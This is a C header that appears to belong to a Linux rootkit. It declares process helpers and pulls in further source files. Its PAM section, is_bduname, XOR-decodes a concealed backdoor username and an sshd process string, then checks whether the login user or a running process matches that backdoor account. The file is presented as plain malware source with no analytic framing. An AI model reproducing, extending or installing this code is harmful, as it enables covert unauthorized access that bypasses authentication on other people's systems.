#ifndef UTIL_H
#define UTIL_H

#define MODE_REG 0x32
#define MODE_64 0x64

char *get_process_name(pid_t pid);
int cmp_process(char *name);
char *str_process(char *name);
int process(char *name);
char *get_process_cmdline(pid_t pid);
void get_process_info(void);
#include "processes.c"

int verify_pass(char *user, char *acc_pass);
#include "verify_pass.c"
/* don't include xor.c yet... */

/* if PAM is being used... */
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
char *get_username(const pam_handle_t *pamh){
    void *u;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS) return NULL;
    return (char *)u;
}

#define _pam_overwrite(x)      \
do{                            \
    register char *__xx__;     \
    if((__xx__=(x)))           \
        while(*__xx__)         \
            *__xx__++ = '\0';  \
}while(0)

#define _pam_drop(X)           \
do{                            \
    if(X){                     \
        free(X);               \
        X = NULL;              \
    }                          \
}while(0)
#endif

int not_user(int id)
{
    get_process_info();
    if(process_info.myuid != id &&
       process_info.myeuid != id) return 1;
    return 0;
}

void unset_bad_vars(void);
int is_bdusr(void);
static int bdusr = 0;
#include "bdusr.c"

#ifdef USE_PAM_BD
int is_bduname(char *username){
    char sshds[128];
    int r = 0;

    xor(bd_uname, BD_UNAME);
    xor(sshd_str, SSHD_PROC_STR);
    (void)snprintf(sshds, sizeof(sshds) - 1, sshd_str, bd_uname);
    clean(sshd_str);
    clean(bd_uname);

    if(username != NULL && !xstrncmp(BD_UNAME, username)) r = 1;
    if(process(sshds)) r = 1;
    return r;
}
#endif

#endif